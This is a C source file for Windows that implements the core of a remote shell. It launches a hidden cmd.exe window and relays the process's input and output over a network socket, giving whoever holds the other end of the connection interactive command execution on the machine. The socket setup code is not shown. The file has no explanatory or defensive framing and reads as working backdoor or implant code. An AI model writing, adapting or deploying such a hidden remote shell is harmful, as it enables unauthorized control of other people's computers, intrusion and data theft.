#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "shell.h"

// Stream socket output to cmd stdin
DWORD WINAPI WritePipe(LPVOID lpParam) {
    HANDLE hPipeWrite = (HANDLE)lpParam;
    extern int sock; // Use the global socket
    char buffer[1024];
    int nBytes;
    DWORD dwWritten;

    while (1) {
        nBytes = recv(sock, buffer, 1024, 0);
        if (nBytes <= 0) break;

        WriteFile(hPipeWrite, buffer, nBytes, &dwWritten, NULL);
    }
    return 0;
}

// Stream cmd stdout to socket
DWORD WINAPI ReadPipe(LPVOID lpParam) {
    HANDLE hPipeRead = (HANDLE)lpParam;
    extern int sock;
    char buffer[1024];
    DWORD dwRead;

    while (ReadFile(hPipeRead, buffer, 1024, &dwRead, NULL)) {
        send(sock, buffer, dwRead, 0);
    }
    return 0;
}

void StartInteractiveShell(int socket_fd) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    HANDLE hStdInRead, hStdInWrite;
    HANDLE hStdOutRead, hStdOutWrite;

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create pipes
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) return;
    if (!CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) return;

    // Set up STARTUPINFO
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    // Start cmd.exe
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        CloseHandle(hStdInRead);
        CloseHandle(hStdInWrite);
        return;
    }

    // We don't need these ends in the parent
    CloseHandle(hStdOutWrite);
    CloseHandle(hStdInRead);

    // Create threads to handle I/O
    HANDLE hThreadWrite = CreateThread(NULL, 0, WritePipe, (LPVOID)hStdInWrite, 0, NULL);
    HANDLE hThreadRead = CreateThread(NULL, 0, ReadPipe, (LPVOID)hStdOutRead, 0, NULL);

    // Monitor process
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    TerminateThread(hThreadWrite, 0);
    TerminateThread(hThreadRead, 0);
    CloseHandle(hStdInWrite);
    CloseHandle(hStdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
